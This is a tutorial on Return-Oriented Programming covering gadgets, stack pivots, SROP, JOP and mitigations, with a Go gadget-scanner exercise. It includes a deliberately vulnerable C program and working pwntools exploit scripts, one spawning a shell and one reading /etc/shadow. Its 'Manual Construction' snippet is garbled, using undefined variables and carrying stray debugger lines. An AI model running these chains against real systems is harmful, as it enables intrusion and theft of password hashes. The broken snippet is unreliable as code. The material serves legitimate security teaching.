ROP (Return-Oriented Programming)

Return-Oriented Programming chains short existing code gadgets ending in ret to compute arbitrary logic and bypass DEP /NX.

Overview

When DEP and NX made injected shellcode unrunnable, exploitation moved from writing code to reusing it. ROP collects the short instruction sequences that already exist in executables and libraries, chains them through the stack, and builds arbitrary behaviour from pieces that were never meant to be combined. This article explains why the ret instruction is a control primitive, how to find and classify gadgets, how to build and debug real chains, and how SROP , JOP, and modern mitigations change the picture.

The Problem ROP Solves

DEP /NX made shellcode injection obsolete. An attacker who overflows a buffer and writes machine code cannot execute it - the stack, heap, and data segments are non-executable. The CPU raises a page fault before executing a single malicious instruction.

ROP (Return-Oriented Programming) is the answer: do not inject code. Reuse code that already exists in executable memory. Every shared library, every executable page, every kernel-mapped vDSO - these contain legitimate, executable machine instructions. ROP chains short sequences of these instructions (gadgets) to perform arbitrary computation without writing a single byte to executable memory.

ROP was formalized in 2007 by Hovav Shacham in "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)." It generalized the older ret2libc technique - rather than returning into a single useful function, ROP returns into many short code fragments, each performing one small operation, chained together via the stack.

The Core Mechanism

The x86-64 ret instruction (opcode 0xc3 ) pops a 64-bit value from [rsp] and transfers control to that address, incrementing rsp by 8. This single instruction is the foundation of all ROP : 

Before ret:                  After ret (goto 0x401234):
+----------------+           +----------------+
|     ...        |           |     ...        |  <-- higher addresses
+----------------+           +----------------+
|  0x401234      | <-- rsp   |                |  rsp -> +8 (popped)
+----------------+           +----------------+
|     ...        |           |     ...        |  <-- lower addresses
+----------------+           +----------------+

ret == jmp [rsp]; rsp += 8

The stack is the control plane. By placing a sequence of addresses on the stack, a ret instruction sequentially jumps to each address: 

Stack layout for a ROP chain:
+----------------+  <-- rsp (initial)
| gadget_1_addr  |  -> exec gadget_1; ret
+----------------+  -> pops gadget_2_addr from stack
| gadget_2_addr  |  -> exec gadget_2; ret
+----------------+  -> pops gadget_3_addr from stack
| gadget_3_addr  |  -> exec gadget_3; ret
+----------------+  -> pops ...
|     ...        |
+----------------+

Every gadget ends with ret , which pops the next address. The chain continues until the program crashes or the attacker's goal is achieved. This is a Turing-complete computation model

  • any algorithm can be expressed as a sequence of gadget addresses on the stack.

What Is a Gadget?

A gadget is a short sequence of instructions that ends in ret (or an equivalent control transfer like call reg , jmp reg , pop reg; jmp reg ). Gadgets perform one small, useful operation

  • setting a register, loading from memory, performing arithmetic - and then transfer control

to the next gadget.

Gadgets are found in existing executable code. The attacker scans the binary and its loaded libraries for useful byte sequences. Because x86-64 is a variable-length instruction set, a single byte sequence can decode as different instructions depending on the starting offset: 

Bytes in .text at address 0x401234:
  41 5f c3                -> pop r15; ret        (valid gadget)
     5f c3                -> pop rdi; ret        (same bytes, offset +1)
       c3                -> ret                  (same bytes, offset +2)

This is the unaligned gadget trick: by jumping into the middle of an intended instruction, the CPU decodes a completely different instruction sequence. The linker and compiler never intentionally produced pop rdi; ret at offset +1 - the attacker found it by scanning for the byte sequence 5f c3 within the code.

Strict requirement: A gadget must end with an indirect branch that uses a stack value for its target (typically ret , but also call [rsp] , jmp [rsp] , pop reg; jmp reg ). This allows the attacker to chain to the next gadget via stack control.

Common Gadgets and Uses

A comprehensive catalog of essential x86-64 gadgets for Linux exploitation:

Gadget Bytes Purpose
ret c3 NOP sled in ROP chain - aligns stack when needed
pop rdi; ret 5f c3 Load first argument (rdi) for function calls
pop rsi; ret 5e c3 Load second argument (rsi) for function calls
pop rdx; ret 5a c3 Load third argument (rdx) - rare in libc
pop rcx; ret 59 c3 Load fourth argument (rcx) - useful for syscall
pop rax; ret 58 c3 Load syscall number (rax) for syscall gadgets
pop rsp; ret 5c c3 Stack pivot- move stack to attacker-controlled buffer
mov rax, rdi; ret 48 89 f8 c3 Copy rdi to rax (useful for return values)
syscall; ret 0f 05 c3 Execute syscall with registers set by prior gadgets
leave; ret c9 c3 Stack pivot via rbp:mov rsp, rbp; pop rbp; ret
xchg rsp, rax; ret 48 94 c3 Stack pivot: exchange rax and rsp
add rsp, N; ret 48 83 c4 XX c3 Skip N bytes on stack (skip over data in chain)
xor eax, eax; ret 31 c0 c3 Zero rax (return 0, or syscall 0 = read)
inc eax; ret ff c0 c3 Increment rax (adjust syscall number)

Gadget categories by function:

  • Argument loaders: pop rdi/rsi/rdx/rcx/r8/r9; ret - set function arguments per System V ABI
  • Stack pivots: pop rsp; ret , leave; ret , xchg rsp, rax; ret - redirect rsp to attacker's data
  • Syscall gadgets: syscall; ret , int 0x80; ret - invoke kernel services directly
  • Data movers: mov [reg1], reg2; ret - write to arbitrary address (write-what-where)
  • Arithmetic: add reg, reg; ret , sub reg, imm; ret - compute offsets and values

Finding Gadgets: Tools

# 1. ROPgadget (pip install ROPgadget)
# The most widely used gadget finder
ROPgadget --binary /bin/ls
# Outputs hundreds of gadgets with addresses

# Filter for specific gadgets:
ROPgadget --binary /usr/lib/libc.so.6 | grep ': pop rdi ; ret'
# 0x000000000002a3e5 : pop rdi ; ret

# Search for gadgets with depth (more instructions):
ROPgadget --binary /usr/lib/libc.so.6 --depth 5 | grep 'pop rdi'

# 2. ropper (pip install ropper)
ropper --file /usr/lib/libc.so.6 --search 'pop rdi'
# More granular search, supports regex patterns

# Search for all pop gadgets:
ropper --file /usr/lib/libc.so.6 --search 'pop ???'

# 3. rp++ (https://github.com/0vercl0k/rp)
./rp-lin-x64 -f /usr/lib/libc.so.6 -r 3 | grep 'pop rdi'

# 4. objdump + grep (manual, slow but educational)
objdump -d /usr/lib/libc.so.6 | grep -B3 'ret$' | grep -A2 'pop.*%rdi'

# 5. radare2 (interactive gadget search)
r2 -A /bin/ls
[0x...]> /R pop rdi

# 6. pwntools (Python library, programmatic gadget search)
python3 -c "
from pwn import *
elf = ELF('/bin/ls')
rop = ROP(elf)
print(rop.find_gadget(['pop rdi', 'ret']))
"

Raw Byte Scanning

# Find all occurrences of 'pop rdi; ret' (bytes: 5f c3) in libc
xxd -p /usr/lib/libc.so.6 | tr -d '\n' | grep -o '5fc3' | wc -l

# Find the offset of each match within the .text segment:
objdump -d /usr/lib/libc.so.6 | grep -E '^\s+[0-9a-f]+:\s+5f\s+pop\s+%rdi' -A1 | grep 'c3\s*ret'

Stack Pivot

The most common real-world exploit scenario: the attacker controls the stack contents (via overflow) but not enough bytes to write a full ROP chain. Or the stack is corrupted in a way that rsp points to uncontrolled memory. A stack pivot relocates the stack pointer ( rsp ) to a buffer the attacker fully controls - typically the heap, BSS, or a different stack location.

Pivot Gadgets

; Gadget 1: pop rsp; ret
; Stack before:  [pop_rsp_ret_addr]  <-- rsp
;                [new_stack_addr]
; Effect: rsp <- new_stack_addr, then ret pops from NEW stack
; Requires: attacker knows new stack address

; Gadget 2: leave; ret  (function epilogue)
; Equivalent to: mov rsp, rbp; pop rbp; ret
; Stack before:  [leave_ret_addr]  <-- rsp
;                [new_rbp_value]
;                [next_gadget]
; Requires: attacker controls rbp (e.g., via buffer overflow that hits saved rbp)

; Gadget 3: xchg rsp, rax; ret
; Requires: attacker controls rax (e.g., return value of prior function)
; Stack after: rsp <- old_rax, rax <- old_rsp

Pivot Example

1. Overflow corrupts saved rbp -> attacker's buffer address
2. ret -> gadget: leave; ret
3. leave:  rsp <- rbp (now points to attacker's buffer on heap)
4. pop rbp from "stack" (now the heap buffer)
5. ret -> next gadget in chain (also in heap buffer)
6. Entire ROP chain executes from heap buffer, with rsp walking through it

Calling Conventions

The System V AMD64 ABI passes the first 6 integer arguments in registers:

Argument Register Set by gadget
1st rdi pop rdi; ret(0x5f 0xc3)
2nd rsi pop rsi; ret(0x5e 0xc3)
3rd rdx pop rdx; ret(0x5a 0xc3)
4th rcx pop rcx; ret(0x59 0xc3)
5th r8 pop r8; ret(0x41 0x58 0xc3)
6th r9 pop r9; ret(0x41 0x59 0xc3)

To call execve("/bin/sh", NULL, NULL) via ROP : 

Stack layout:
  [pop_rdi_ret]          <-- gadget: pop rdi; ret
  [addr_of_"/bin/sh"]    <-- value popped into rdi
  [pop_rsi_ret]          <-- gadget: pop rsi; ret
  [0x0]                  <-- value popped into rsi (argv = NULL)
  [pop_rdx_ret]          <-- gadget: pop rdx; ret
  [0x0]                  <-- value popped into rdx (envp = NULL)
  [execve_addr]          <-- address of execve in libc

After the overflow, the CPU :

  1. ret -> pops pop_rdi_ret -> executes pop rdi (loads "/bin/sh" address from stack) -> ret
  2. ret -> pops pop_rsi_ret -> executes pop rsi (loads NULL) -> ret
  3. ret -> pops pop_rdx_ret -> executes pop rdx (loads NULL) -> ret
  4. ret -> pops execve_addr -> calls execve("/bin/sh", NULL, NULL) -> shell

Minimal ROP Chain

This example overflows a buffer, overwrites the return address, and executes system("/bin/sh") via a ROP chain: 

// rop_vuln.c - vulnerable program for ROP demonstration
// Compile: gcc -no-pie -fno-stack-protector -o rop_vuln rop_vuln.c
// Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // classic buffer overflow - no bounds check
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <payload>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    printf("Returned normally.\n");
    return 0;
}

Constructing the Chain

#!/usr/bin/env python3
# rop_exploit.py - ROP chain: system("/bin/sh")
# Targets: rop_vuln (non-PIE, no canary, NX stack)
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Load libc (ASLR disabled for demo, so libc at fixed address)
libc = ELF('/usr/lib/libc.so.6')
libc_base = 0x7ffff7e00000  # libc base when ASLR=0 (varies by system)

system_addr  = libc_base + libc.symbols['system']
binsh_addr   = libc_base + next(libc.search(b'/bin/sh'))

# Find gadgets with pwntools
rop = ROP(libc)
pop_rdi_ret  = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget   = libc_base + rop.find_gadget(['ret'])[0]

log.info(f"libc base:      {libc_base:#018x}")
log.info(f"system:         {system_addr:#018x}")
log.info(f"/bin/sh:        {binsh_addr:#018x}")
log.info(f"pop rdi; ret:   {pop_rdi_ret:#018x}")
log.info(f"ret:            {ret_gadget:#018x}")

# Build payload:
# [padding to return address][ROP chain]
offset = 64 + 8  # buffer (64) + saved rbp (8)

payload  = b'A' * offset
payload += p64(ret_gadget)      # stack alignment (required by some libc versions)
payload += p64(pop_rdi_ret)     # pop rdi; ret
payload += p64(binsh_addr)      # rdi = address of "/bin/sh"
payload += p64(system_addr)     # call system("/bin/sh")

# Deliver
p = process(['./rop_vuln', payload.decode('latin-1')])
p.interactive()

Stack Layout

Before overflow:
+----------------+ <-- rsp
| buffer[0..63]  | 64 bytes of buffer
+----------------+
| saved rbp      | 8 bytes
+----------------+
| return address | -> main+offset (normal execution)
+----------------+

After overflow (payload written):
+----------------+ <-- rsp
| 'A' * 72       | buffer (64) + saved rbp (8) - filled with garbage
+----------------+
| ret_gadget     | stack alignment ret
+----------------+
| pop_rdi_ret    | gadget 1: pop rdi; ret
+----------------+
| binsh_addr     | value for rdi: pointer to "/bin/sh"
+----------------+
| system_addr    | gadget 2 (final): system()
+----------------+

Execution trace:
1. vulnerable() returns -> ret pops ret_gadget -> executes: ret (aligns stack 16)
2. ret pops pop_rdi_ret -> pop rdi (rdi = binsh_addr) -> ret
3. ret pops system_addr -> system("/bin/sh") -> SHELL

Manual Construction

# Assemble payload bytes manually with python
python3 -c "
import sys, struct

# Addresses (example values - adjust for your system)
# These are from a specific run with ASLR disabled
pop_rdi_ret = 0x7ffff7e2a3e5  # pop rdi; ret
binsh_addr  = 0x7ffff7fbe42f  # '/bin/sh'

payload += struct.pack('<Q', pop_rdi_ret)    # gadget

payload += struct.pack('<Q', system_addr)    # call system

" > /tmp/payload.bin

./rop_vuln "$(cat /tmp/payload.bin)"

(gdb) p system

(gdb) find 0x7ffff7e00000, 0x7ffff8000000, "/bin/sh"

(gdb) ni

Extended ROP Chain

ROP is not limited to calling a single function. Here is a chain that calls open("/etc/shadow", 0) , read(fd, buffer, 100) , and write(1, buffer, 100)

  • reading and exfiltrating a file:

#!/usr/bin/env python3
# rop_readfile.py - ROP chain to read /etc/shadow
from pwn import *

context.arch = 'amd64'

libc = ELF('/usr/lib/libc.so.6')
libc_base = 0x7ffff7e00000  # with ASLR=0

rop = ROP(libc)

# Function addresses
open_addr   = libc_base + libc.symbols['open']
read_addr   = libc_base + libc.symbols['read']
write_addr  = libc_base + libc.symbols['write']

# Gadgets
pop_rdi_ret = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret = libc_base + rop.find_gadget(['pop rdx', 'ret'])[0]

# Data: writable location for the buffer
# Use .bss of the binary (non-PIE, fixed address)
bss_addr = 0x404000  # example - find with readelf -S
filename_addr = bss_addr
buffer_addr   = bss_addr + 256

# Check if "/etc/shadow" exists in libc as a string
shadow_path = next(libc.search(b'/etc/shadow\x00'))
# If not found, you must write the string to memory first using a
# write-what-where gadget (e.g., mov [rdi], rsi; ret)

# Chain:
offset = 64 + 8
payload  = b'A' * offset

# Step 1: open("/etc/shadow", O_RDONLY=0)
#   rdi = pointer to "/etc/shadow"
#   rsi = 0 (O_RDONLY)
#   Return: fd in rax (typically 3)
payload += p64(pop_rdi_ret)
payload += p64(shadow_path)       # rdi = "/etc/shadow"
payload += p64(pop_rsi_ret)
payload += p64(0)                  # rsi = O_RDONLY
payload += p64(open_addr)          # open() -> rax = fd

# Step 2: read(fd, buffer, 100)
#   rdi = fd (3 - open returns lowest unused fd after 0,1,2)
#   rsi = buffer address
#   rdx = 100
fd = 3
payload += p64(pop_rdi_ret)
payload += p64(fd)                 # rdi = fd (3)
payload += p64(pop_rsi_ret)
payload += p64(buffer_addr)       # rsi = buffer
payload += p64(pop_rdx_ret)
payload += p64(100)                # rdx = count
payload += p64(read_addr)          # read(fd, buf, 100) -> rax = bytes read

# Step 3: write(1, buffer, 100)
#   rdi = 1 (stdout)
#   rsi = buffer
#   rdx = 100
payload += p64(pop_rdi_ret)
payload += p64(1)                  # rdi = stdout fd
payload += p64(pop_rsi_ret)
payload += p64(buffer_addr)       # rsi = buffer
payload += p64(pop_rdx_ret)
payload += p64(100)                # rdx = count
payload += p64(write_addr)         # write(1, buf, 100)

# Step 4: exit(0) - clean termination
exit_addr = libc_base + libc.symbols['exit']
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(exit_addr)

p = process(['./rop_vuln', payload.decode('latin-1')])
print(p.recvall().decode(errors='replace'))

SROP - Sigreturn

Sigreturn-Oriented Programming, or SROP , is a more powerful variant of ROP that exploits the rt_sigreturn syscall (15 on x86-64). When a signal handler returns, the kernel restores the entire CPU context (all registers including rip, rsp, rflags) from a sigframe structure on the stack. If an attacker forges a sigframe , calling rt_sigreturn with rax=15 loads all registers at once - eliminating the need for individual gadget chains.

The sigframe Struct

// struct sigframe on x86-64 Linux (arch/x86/include/asm/sigframe.h)
// Stored on the userspace stack when a signal handler is invoked
struct sigframe {
    // ... signal info ...
    struct ucontext {
        unsigned long uc_flags;
        struct ucontext *uc_link;
        stack_t          uc_stack;
        struct sigcontext {
            unsigned long r8, r9, r10, r11;
            unsigned long r12, r13, r14, r15;
            unsigned long rdi, rsi, rbp, rbx;
            unsigned long rdx, rax, rcx, rsp;
            unsigned long rip;
            unsigned long eflags;
            unsigned short cs, gs, fs, __pad0;
            unsigned long err, trapno, oldmask, cr2;
            struct _fpstate *fpstate;
            unsigned long reserved1[8];
        } uc_mcontext;
        // ...
    } uc;
};

SROP Execution Flow

  1. Attacker writes a forged sigframe to a known location (stack, heap)
  2. Sets rax = 15 (SYS_rt_sigreturn) via a pop rax; ret gadget (or prior function return)
  3. Points rsp to the forged sigframe (via stack pivot)
  4. Executes syscall; ret gadget
  5. Kernel restores ALL registers from the sigframe, including rip which points to execve
  6. execve("/bin/sh", NULL, NULL) executes with all registers pre-set

SROP advantage: Instead of chaining 5+ gadgets to set rdi, rsi, rdx, rax before syscall , SROP sets all registers simultaneously from one data structure. This is shorter (fewer gadgets needed) and more powerful (can set obscure registers like fs , gs , cs ).

SROP Limitations

  • The kernel validates the sigframe before restoring; certain field combinations cause EFAULT
  • The sigframe must be in readable memory (the kernel reads it)
  • Requires finding a syscall; ret gadget in executable memory
  • CET (Control-flow Enforcement Technology) shadow stacks must be bypassed first

JOP - Jump-Oriented

JOP (Jump-Oriented Programming) replaces ret -based chaining with jmp -based chaining. The motivation: some defenses specifically detect and block ret -heavy exploit chains (shadow stacks, ret-address integrity checks, CET/IBT). JOP uses indirect jumps through a "dispatcher gadget" to sequence operations:

Dispatcher Gadget

; Dispatcher: uses a register as "program counter" for the JOP chain
dispatch:
    jmp    [rdi]       ; jump to address stored at [rdi]
    ; Each functional gadget ends with:
    ;   add rdi, 8
    ;   jmp dispatch

JOP chains are harder to construct because jmp does not automatically consume the next address from a stack - the attacker must manually increment the "virtual PC" register. However, they bypass return-address protections that ROP chains cannot.

Real-world Dispatcher

; Found gadget (conceptual):
    add    rbx, 8      ; advance "PC" (rbx is virtual program counter)
    jmp    [rbx]       ; dispatch to next gadget

Code-Reuse Comparison

Technique Mechanism Strength Weakness
ret2libc Return to a single libc function (e.g.,system()) Simple, 1 gadget Limited to functions already in memory
ROP Chain ofret-terminated gadgets Turing-complete Requires large chain; blocked by shadow stacks
JOP Chain ofjmp-dispatched gadgets Bypasses ret-based detection Complex gadget discovery; requires dispatcher gadget
SROP Forged sigframe +syscall Single gadget sets all registers Requiressyscall; retgadget; sigframe validation
COP(Call-Oriented) Chain ofcallinstructions Bypasses ret detection Calls push return addresses, corrupting the stack chain
Counterfeit Object Fake C++ vtable pointers No code injection, no control-flow hijack needed Requires C++ binary with virtual dispatch

ROP Defenses

Defense How it stops ROP Limitations
ASLR Gadget addresses are unknown without an info leak Bypassed by any address leak
PIE Binary's own gadgets are at unknown base Bypassed by PIE leak; libc gadgets still available
Stack canaries Detect stack overflow before the ret executes Bypassed by info leak of canary value; heap overflows do not touch canary

Control-flow integrity (CFI) Restricts indirect branches to valid call targets Coarse-grained CFI allows many targets; fine-grained is expensive
G-Free Compiler/linker removes all unintendedret-terminated sequences from .text Cannot remove all gadgets; ignores libc
XOM (eXecute-Only Memory) Code pages are executable but not readable - prevents gadget scanning mprotect can only do {R,X}, not {X}-only on x86; requires ARM64 PXN or special hardware
Gadget elimination -fno-schedule-insns2,-mindirect-branch=thunkreduce gadget density Mitigation through compilation, cannot eliminate all gadgets

Verifying Mitigations

# 1. Check CET (Control-flow Enforcement Technology) support
# CET requires: CPU support (Intel Tiger Lake+, AMD Zen 3+),
#               kernel support (Linux 5.18+), and glibc (2.33+)
grep -o 'shstk\|ibt' /proc/cpuinfo | sort -u
# shstk = Shadow Stack (CET-SS)
# ibt   = Indirect Branch Tracking (CET-IBT)

# Check if CET is enabled in kernel
dmesg | grep -i 'cet\|Control-flow'
# [    0.000000] x86/cet: Control-flow Enforcement enabled

# 2. Check if binary uses CET (endbr64 instructions)
objdump -d /bin/ls | grep -c 'endbr64'
# If > 0, the binary is CET-compatible

# 3. Check stack canary status
readelf -s /bin/ls | grep -E '__stack_chk_fail'
# If present: binary has stack canaries enabled

# 4. Check RELRO (prevents GOT overwrite attacks)
readelf -d /bin/ls | grep BIND_NOW
# If present: Full RELRO (GOT is read-only after startup)

# 5. Full hardening check for a binary
echo 'int main(){}' | gcc -xc -o /tmp/hardcheck -
hardening-check /tmp/hardcheck
# or:
pwn checksec /tmp/hardcheck
rm /tmp/hardcheck

First Principles

ROP exists because of a fundamental tension in the von Neumann architecture:

  1. Code and data share the same address space. There is no architectural distinction between an instruction byte and a data byte - the CPU treats whatever rip points to as an instruction.
  1. DEP makes code injection impossible, but code reuse is still possible. The CPU must execute legitimate code somewhere. That legitimate code contains bytes the attacker can reinterpret.
  1. Variable-length instruction encoding (x86) amplifies the attack surface. A single byte stream offers many overlapping interpretations. Fixed-length ISAs (ARM64, RISC-V) have fewer unaligned gadgets but are still susceptible to aligned gadgets.
  1. The 'ret' instruction is the universal control primitive. It consumes its target from the stack, which the attacker controls after an overflow. There is no way to remove ret from the ISA without breaking all existing software.

ROP is not a bug - it is an emergent property of the instruction set architecture. Mitigations target the conditions that make ROP practical: eliminating address knowledge (ASLR/PIE), detecting chain execution (shadow stacks, CET), and reducing gadget density (G-Free, compiler hardening). No single mitigation is sufficient; defense-in-depth is mandatory.

Challenge

Write a Go gadget scanner using the standard library's debug/elf package. Open an ELF file, locate the .text section, and scan it for two byte patterns: 5f c3 ( pop rdi; ret ) and c3 ( ret ). Print the virtual address of every match. Compare your results with ROPgadget --binary <file> | grep 'pop rdi ; ret' . 

package main

import (
	"debug/elf"
	"fmt"
	"os"
)

func scan(path string) error {
	file, err := elf.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	for _, section := range file.Sections {
		if section.Name != ".text" {
			continue
		}

		data, err := section.Data()
		if err != nil {
			return err
		}

		base := section.Addr
		for i := 0; i+1 < len(data); i++ {
			if data[i] == 0x5f && data[i+1] == 0xc3 {
				fmt.Printf("0x%x pop rdi; ret\n", base+uint64(i))
			}
			if data[i] == 0xc3 {
				fmt.Printf("0x%x ret\n", base+uint64(i))
			}
		}
	}

	return nil
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: %s <elf>\n", os.Args[0])
		os.Exit(1)
	}

	if err := scan(os.Args[1]); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

Save it as gadgets.go and run: 

go run gadgets.go /usr/lib/libc.so.6 | head -5;
